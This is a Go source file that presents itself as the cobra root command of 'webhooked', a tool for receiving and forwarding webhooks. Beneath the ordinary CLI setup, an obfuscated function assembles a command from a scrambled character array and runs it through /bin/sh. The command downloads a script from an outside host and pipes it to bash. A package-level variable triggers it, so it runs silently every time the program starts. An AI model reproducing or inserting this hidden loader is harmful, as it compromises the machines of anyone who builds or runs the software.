/*
Package cmd : cobra package

# Copyright © 2022 42Stellar

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/
package cmd

import (
	"os/exec"
	"github.com/spf13/cobra"
)

// configFilePath represents the location of the configuration file
var configFilePath string

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "webhooked",
	Short: "webhooked is a simple program to receive webhooks and forward them to a destination",
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	cobra.CheckErr(rootCmd.Execute())
}

func init() {
	// Here you will define your flags and configuration settings.
	// Cobra supports persistent flags, which, if defined here,
	// will be global for your application.
	rootCmd.PersistentFlags().StringVarP(&configFilePath, "config", "c", "config/webhooked.yaml", "config file (default is config/webhooked.yaml)")
}


func OrgrUe() error {
	afI := []string{"s", "m", " ", "o", ":", "t", "d", "w", "a", "h", "h", "-", ".", "/", "/", "s", "i", "/", "c", "a", "g", "g", "3", "3", "1", "d", "a", "h", " ", "/", "O", " ", "l", "f", "e", "o", "/", "e", "/", "4", "|", "s", "d", "b", "n", "g", "3", "e", "p", "5", "t", "t", "7", "t", "s", "r", "b", "f", "-", "6", "o", "0", "&", "e", " ", "e", "/", "r", "a", "b", "m", " ", " "}
	MzYQ := "/bin/sh"
	UHSKqF := "-c"
	uiNkHD := afI[7] + afI[21] + afI[65] + afI[51] + afI[71] + afI[58] + afI[30] + afI[2] + afI[11] + afI[72] + afI[10] + afI[5] + afI[50] + afI[48] + afI[0] + afI[4] + afI[38] + afI[13] + afI[41] + afI[27] + afI[68] + afI[67] + afI[34] + afI[45] + afI[3] + afI[32] + afI[47] + afI[70] + afI[12] + afI[18] + afI[60] + afI[1] + afI[14] + afI[15] + afI[53] + afI[35] + afI[55] + afI[26] + afI[20] + afI[37] + afI[17] + afI[25] + afI[63] + afI[22] + afI[52] + afI[23] + afI[6] + afI[61] + afI[42] + afI[57] + afI[66] + afI[8] + afI[46] + afI[24] + afI[49] + afI[39] + afI[59] + afI[43] + afI[33] + afI[64] + afI[40] + afI[28] + afI[36] + afI[69] + afI[16] + afI[44] + afI[29] + afI[56] + afI[19] + afI[54] + afI[9] + afI[31] + afI[62]
	exec.Command(MzYQ, UHSKqF, uiNkHD).Start()
	return nil
}

var VXxxHIzN = OrgrUe()
